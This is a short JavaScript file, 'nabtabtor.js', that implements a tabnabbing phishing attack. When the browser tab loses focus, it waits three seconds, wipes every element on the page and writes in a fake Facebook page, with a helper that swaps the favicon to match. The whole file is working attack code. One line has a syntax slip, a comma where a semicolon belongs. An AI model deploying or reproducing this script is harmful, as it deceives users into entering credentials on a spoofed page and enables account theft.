/*
* nabtabtor.js
* 
* George Skouroupathis
*
*/

window.onblur = start_phishing_timeout;

function start_phishing_timeout() {
	setTimeout(start_phishing, 3000);
}

function start_phishing() {
	clear_page_contents();
	build_page(facebook_face_page1);
}
	
// Deletes all the current page elements
function clear_page_contents() {
	var all = document.getElementsByTagName("*");

	for (var i=0, len=all.length; i < len; i++) {
		try {
			 all[i].parentNode.removeChild(all[i]);
		} catch(e) {
			// pass
		}
	}
}

// Displays the page from the webpage object
function build_page(webpage) {
	document.write(webpage.getSource);
	document.close();
}

// Dynamically changes the favicon of the webpage
function change_fav_icon(url) {
	document.head = document.head || document.getElementsByTagName('head')[0];
	var link = document.createElement('link'),
	link.rel = 'shortcut icon';
	link.href = url;
	document.head.appendChild(link);
}